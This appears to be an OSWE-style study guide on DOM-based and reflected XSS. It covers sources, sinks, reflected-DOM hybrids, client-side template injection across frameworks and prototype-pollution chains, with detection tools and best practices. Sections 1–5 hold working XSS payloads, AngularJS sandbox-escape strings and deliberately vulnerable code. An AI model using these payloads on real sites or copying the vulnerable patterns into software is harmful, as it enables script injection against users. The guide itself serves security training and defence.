# DOM-Based & Reflected XSS Hybrid Vectors — OSWE Level

> White-box, manual-exploitation focus. Covers source→sink tracing, server-reflected DOM execution, client-side template injection, prototype-pollution chains, and detection methodology.

---

## 1. Sources

A **source** is any attacker-controllable input that reaches client-side code without a trusted transformation. In DOM XSS the payload never needs to touch the server's response body in a reflected form — it is read directly by JS.

| Source | Read API | Notes |
|---|---|---|
| Query string | `location.search`, `URLSearchParams` | Most common; stays in URL |
| Fragment | `location.hash` | Never sent to server; client-only |
| Referrer | `document.referrer` | Cross-origin leakage vector |
| Window name | `window.name` | Persists across navigations; survives origin changes |
| postMessage | `window.addEventListener('message', …)` | Origin validation is the control |
| Storage | `localStorage` / `sessionStorage` / `IndexedDB` | Second-order / stored DOM XSS |

### 1.1 `location.search`

```js
// VULNERABLE
const params = new URLSearchParams(location.search);
const q = params.get('q');
document.getElementById('out').innerHTML = q;   // sink
```

PoC: `https://target/app?q=<img src=x onerror=alert(1)>`

### 1.2 `location.hash`

```js
// VULNERABLE — fragment never hits the server
const section = location.hash.slice(1);
document.write('<h2>' + section + '</h2>');      // sink
```

PoC: `https://target/app#<svg onload=alert(1)>`

### 1.3 `document.referrer`

```js
// VULNERABLE
const ref = document.referrer;
sidebar.innerHTML = 'Came from: ' + ref;
```

Trigger by navigating from an attacker page whose URL contains the payload (referrer is set by the browser unless `Referrer-Policy: no-referrer`).

### 1.4 `window.name`

```js
// VULNERABLE — name persists across origin changes
const name = window.name;
eval('var cfg = ' + name + ';');                // sink
```

Trigger: attacker page sets `window.name = 'alert(1)//'` then redirects to target. `window.name` is not cleared on cross-origin navigation (legacy behavior; still exploitable where not reset).

### 1.5 `postMessage`

```js
// VULNERABLE — no origin check
window.addEventListener('message', (e) => {
  document.getElementById('panel').innerHTML = e.data;   // sink
});
```

PoC from attacker origin:

```js
const w = window.open('https://target/app');
w.postMessage('<img src=x onerror=alert(1)>', '*');
```

Secure pattern:

```js
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://trusted.example') return;
  // additionally validate e.data shape
});
```

### 1.6 Storage (second-order DOM XSS)

```js
// write (possibly from a reflected/first-order vector)
localStorage.setItem('displayName', userInput);

// later read → sink
const n = localStorage.getItem('displayName');
profile.innerHTML = n;
```

Also `sessionStorage`, `IndexedDB`, and Service Worker caches. Treat storage as an untrusted source on read.

---

## 2. Sinks

A **sink** is a function/property that interprets a string as code or markup.

| Sink | Effect | Typical bypass notes |
|---|---|---|
| `innerHTML` / `outerHTML` | HTML parse | `<img src=x onerror=…>`, `<svg onload=…>` |
| `document.write` / `writeln` | HTML parse (incl. in open doc) | Breaks out of `<script>` context |
| `eval` | JS execution | Direct code |
| `setTimeout`/`setInterval` (string) | JS execution | `setTimeout(user, 0)` |
| Location assignment (`location=`, `location.href`, `location.replace`) | Navigation / `javascript:` | `javascript:alert(1)` |
| `outerHTML` | HTML parse incl. element replacement | Same as innerHTML |

### 2.1 `innerHTML` / `outerHTML`

```js
el.innerHTML = userInput;        // parses HTML, runs inline handlers
el.outerHTML = userInput;        // replaces element; handlers still fire
```

### 2.2 `document.write`

```js
document.write('<p>' + q + '</p>');   // q breaks out of tag
```

### 2.3 `eval`

```js
eval('var x = ' + userInput + ';');   // direct code execution
```

### 2.4 `setTimeout` / `setInterval` (string form)

```js
setTimeout(userInput, 100);            // string → eval-like
setInterval('doThing(' + userInput + ')', 1000);
```

Note: passing a function reference is safe; only the string form is a sink.

### 2.5 Location assignment

```js
location.href = userInput;            // javascript: URI executes
location.assign(userInput);
location.replace(userInput);
window.location = userInput;
```

PoC: `userInput = 'javascript:alert(document.domain)'`

### 2.6 `outerHTML`

```js
container.outerHTML = '<div>' + userInput + '</div>';
```

---

## 3. Reflected-DOM Hybrid

The server reflects attacker input into the **JavaScript context** of the response; client code then feeds that reflected value into a DOM sink. The reflection itself may be "safe" (e.g., JSON-encoded in a `<script>` variable), but the downstream sink makes it executable.

### 3.1 Reflected into a JS variable → DOM sink

Server response:

```html
<script>
  var searchQuery = "USER_INPUT_HERE";   // reflected, JSON-ish encoded
</script>
...
<script>
  document.getElementById('results').innerHTML =
      'You searched for: ' + searchQuery;   // sink
</script>
```

Payload breaks out of the string if encoding is weak:

```
";alert(1);//
```

Resulting reflected script:

```js
var searchQuery = "";alert(1);//";
```

Then the sink runs with the attacker-controlled value.

### 3.2 Reflected JSONP / callback

```html
<script src="/api/search?callback=renderResults&q=foo"></script>
```

Server reflects:

```js
renderResults({"q":"foo","html":"<b>foo</b>"});
```

If `callback` is reflected unvalidated:

```
/api/search?callback=alert(1)//
```

yields `alert(1)//({...})` — direct execution before any DOM sink.

### 3.3 Reflected into an event handler / attribute

```html
<input value="REFLECTED" onclick="doSearch('REFLECTED')">
```

Payload: `');alert(1);//` → `doSearch('');alert(1);//')`.

### 3.4 Hybrid chain (server reflect → DOM sink)

```
Request: /search?q=<svg onload=alert(1)>
Response body contains:
  <script>var q = "<svg onload=alert(1)>";</script>   // reflected (encoded? if not, break)
  ...
  results.innerHTML = q;                              // DOM sink executes
```

Even when the server HTML-encodes the reflection, a later `innerHTML` assignment of the already-decoded JS variable re-introduces execution. This is the "reflected-DOM hybrid": reflection supplies the value, the DOM sink provides execution.

### 3.5 Gadget: reflected config object

```js
// server
window.__CONFIG__ = {"theme":"REFLECTED","debug":false};

// client
if (window.__CONFIG__.debug) panel.innerHTML = window.__CONFIG__.theme;
```

Pollute/reflect `theme` with markup; gate on a reflected `debug:true`.

---

## 4. Client-Side Template Injection (CSTI) → XSS

### 4.1 AngularJS (1.x) — sandbox escapes

AngularJS evaluates `{{ }}` expressions in the DOM. Versions and notable sandbox bypasses:

| AngularJS version | Bypass (simplified) |
|---|---|
| 1.0.x – 1.1.x | `{{constructor.constructor('alert(1)')()}}` |
| 1.2.x | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}` |
| 1.3.x | `{{{}[['__proto__']]['x']=…}}` style gadget chains |
| 1.4.x | `{{'a'.constructor.prototype.charAt=[].join;…}}` |
| 1.5.x – 1.6.x | Constructor-chain bypasses until sandbox removed in 1.6 |

AngularJS 1.6 removed the expression sandbox entirely; from 1.6+, `{{constructor.constructor('alert(1)')()}}` works directly. Angular (2+) does **not** evaluate templates from DOM text by default, but:

- `DomSanitizer.bypassSecurityTrustHtml()` / `bypassSecurityTrustScript()` explicitly disables sanitization.
- Server-rendered Angular (Universal) with unsanitized `innerHTML` bindings.
- ` bypassSecurityTrustResourceUrl` + `<iframe [src]="…">`.

PoC (AngularJS 1.x):

```html
<div ng-app>
  {{constructor.constructor('alert(document.domain)')()}}
</div>
```

### 4.2 Vue.js

- Vue 2 / 3: `v-html="userInput"` renders raw HTML (no sanitization) → classic XSS.
- Vue template compiler: if attacker controls a template string passed to `new Vue({ template: userInput })` or `Vue.compile(userInput)`, full code execution.
- Vue 2 `v-html` does not execute `<script>` tags but does execute inline event handlers in parsed HTML (browser-dependent; `<img onerror>` fires).
- Vue 3: same; `v-html` uses `innerHTML`.

PoC:

```js
// Vue 2/3
new Vue({ el:'#app', template: userInput });   // userInput = '<script>alert(1)</script>'
```

### 4.3 React

React does not parse templates from strings; XSS vectors are:

- `dangerouslySetInnerHTML={{ __html: userInput }}` (the only HTML sink).
- `href={userInput}` with `javascript:` URIs (React 16+ blocks `javascript:` in `href`/`src` for `<a>`/`<iframe>` in newer versions, but `href` on other elements and older React (<16) are vulnerable).
- `target`/`rel` not relevant.
- Server Components / SSR: unsanitized props rendered into HTML.

PoC:

```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
<a href={userInput}>click</a>   // javascript: in older React
```

### 4.4 Other frameworks

- **Svelte**: `{@html userInput}` sink; compiled templates are safe unless `@html`.
- **SolidJS**: `innerHTML={userInput}`.
- **Lit**: `unsafeHTML` directive.
- **Handlebars/Mustache (client)**: `{{{triple}}}` unescaped; if template source is attacker-controlled → RCE/XSS.
- **Polymer / Web Components**: `innerHTML` in shadow DOM.

---

## 5. Prototype Pollution → XSS Chains

Prototype pollution sets properties on `Object.prototype`, which then leak into objects via inheritance, reaching gadgets that read those properties and sink them.

### 5.1 Pollution primitives

```js
// __proto__
obj['__proto__']['x'] = 'polluted';

// constructor.prototype
obj['constructor']['prototype']['x'] = 'polluted';

// merge/assign with untrusted input
_.merge({}, userInput);          // lodash < 4.17.12
$.extend(true, {}, userInput);    // jQuery < 3.4.0 (deep extend)
Object.assign(target, untrusted); // shallow; still pollutes if target is Object.prototype
```

Affected libraries (historical): lodash (<4.17.12), jQuery (<3.4.0), `merge`, `deep-extend`, `hoek`, `mout`, `unset-value`.

### 5.2 Pollution → XSS gadget chains

Common gadgets:

1. **Template engine gadget**: pollution of `Object.prototype.sourceURL` / `escapeFunction` in older lodash templates, or `Object.prototype` keys consumed by a templating library, enabling code execution.
2. **DOM clobbering + pollution**: pollute `Object.prototype.id`/`name` so `document.getElementById` returns an attacker element whose `.innerHTML`/`.src` is then used.
3. **`srcdoc` / `src` gadget**: a sanitizer or widget reads `config.srcdoc` with default from prototype; pollution sets `srcdoc` to `<script>…</script>`.
4. **`innerHTML` gadget in UI libs**: components that do `element.innerHTML = options.template || defaults` where `defaults` is polluted.

Example chain (conceptual):

```js
// 1. Pollute
fetch('/api/merge', {
  method:'POST',
  body: JSON.stringify({"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}})
});

// 2. Later, app code:
const opts = {};                 // inherits polluted innerHTML
container.innerHTML = opts.innerHTML;   // XSS
```

### 5.3 Client-side prototype pollution (URL/query)

```js
// VULNERABLE parser
function parse(qs) {
  const out = {};
  for (const [k,v] of new URLSearchParams(qs)) {
    // naive nested set: a[b][c]=v
    setPath(out, k, v);            // if k = __proto__.x, pollutes prototype
  }
  return out;
}
```

PoC query: `?__proto__[innerHTML]=<img src=x onerror=alert(1)>`

### 5.4 Detection of pollution

- Search for recursive merge/extend/assign with untrusted input.
- Check `Object.prototype` mutation in DevTools: `Object.prototype.polluted`.
- Use `pp-finder` / `ppscan` / DOM Invader "Prototype pollution" scan.

---

## 6. Detection Approach

### 6.1 Static source→sink tracing

- **CodeQL**: `js/xss`, `js/dom-based-xss` queries; taint tracking from sources (`location`, `window.name`, `postMessage` data) to sinks (`innerHTML`, `eval`, …).
- **Semgrep**: rules `javascript.lang.security.audit.xss.*`, `dom-xss`.
- **ESLint security plugins**: `eslint-plugin-security`, `eslint-plugin-no-unsanitized`.
- **Manual**: grep for sinks, back-trace arguments to sources; check sanitizers (`DOMPurify.sanitize`, `textContent`, `innerText`).

Static strengths: finds all paths including rarely hit branches; no runtime needed. Weaknesses: framework abstractions, dynamic property access, prototype pollution (taint through prototype is hard).

### 6.2 Dynamic testing

- **Browser DevTools**: breakpoints on sink calls; inspect call stacks.
- **DOM Invader** (Burp): automated DOM XSS scanning with canary injection into sources.
- **XSS Hunter / interactsh**: blind/second-order detection via callbacks.
- **Playwright/Puppeteer harness**: inject canaries into `location.search/hash`, `window.name`, `postMessage`, storage; monitor for `alert`/sink execution.
- **Fuzzing sources**: mutate each source with a unique canary and observe sink arguments via hooked setters.

Dynamic strengths: confirms exploitability, handles framework/runtime behavior. Weaknesses: coverage depends on paths exercised; misses dead code.

### 6.3 Hybrid methodology (OSWE-style)

1. Map all sources and sinks in the codebase (static grep + CodeQL).
2. For each source→sink path, determine whether a sanitizer breaks the chain.
3. Test reflected endpoints for context (HTML/JS/attribute/URL) and encoding.
4. For CSTI, identify framework version and applicable sandbox bypass.
5. For prototype pollution, identify merge functions and test gadget reachability.
6. Chain: use a low-impact primitive (reflected param) to seed storage/`window.name`, then trigger DOM sink on a privileged page.

### 6.4 Sanitizer reference (for verification)

- `textContent` / `innerText` — safe for text.
- `DOMPurify.sanitize(x, {USE_PROFILES:{html:true}})` — safe if kept updated.
- React/Angular/Vue auto-escaping in templates — safe unless bypass APIs used.
- `encodeURIComponent` for URL contexts; never for HTML.

---

## Best Practices

- Treat every source in §1 as untrusted; validate at the boundary.
- Prefer `textContent` over `innerHTML`; if HTML is required, sanitize with an up-to-date DOMPurify.
- Avoid string-form `setTimeout`/`setInterval` and `eval`/`new Function`.
- Validate `postMessage` origin strictly; never use `'*'` as targetOrigin for sensitive data.
- Avoid deep-merge of untrusted objects; use schema validation (zod/joi) and `Object.create(null)` for dictionaries.
- Keep frameworks updated; AngularJS 1.x is EOL and trivially exploitable via CSTI — migrate.
- Use CSP (`script-src` without `unsafe-inline`/`unsafe-eval`) as defense-in-depth, not primary control.
- For OSWE: always perform white-box source→sink tracing first, then build minimal PoC URLs.